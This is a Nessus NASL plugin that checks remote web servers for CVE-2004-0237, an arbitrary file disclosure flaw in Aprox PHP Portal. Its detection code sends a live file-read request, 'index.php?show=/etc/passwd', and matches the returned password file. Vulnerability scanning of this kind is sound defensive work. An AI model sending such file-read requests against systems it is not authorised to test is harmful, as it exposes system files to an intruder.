#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(12031);
 script_cve_id("CVE-2004-0237");
 script_bugtraq_id(9540);
 script_xref(name:"OSVDB", value:"10859");
 script_xref(name:"OSVDB", value:"3805");
 script_version ("$Revision: 1.13 $");
 
 script_name(english:"Aprox PHP Portal index.php Arbitrary File View");
 script_summary(english:"Checks Aprox Portal");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host is running a PHP application that is affected by a
file disclosure vulnerbility." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Aprox Portal - a PHP-based content
management system.

There is a bug in this software which may allow an attacker to read
arbitrary files on the remote web server with the privileges of the
web user.

In addition, this software is reportedly vulnerable to a local file
inclusion attack.  However, Nessus has not checked for this." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2004-02/0042.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrading to Aprox Portal 4.00.08 or newer reportedly fixes the issue." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
 script_end_attributes();
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2004-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
 req = string(dir,"/index.php?show=/etc/passwd");
 r = http_send_recv3(method:"GET", item:req, port:port);
 if (isnull(r)) exit(0);
 buf = strcat(r[0], r[1], '\r\n', r[2]);

 if(egrep(pattern:".*root:.*:0:[01]:.*", string:buf)){
 	security_warning(port);
	exit(0);
	}
}
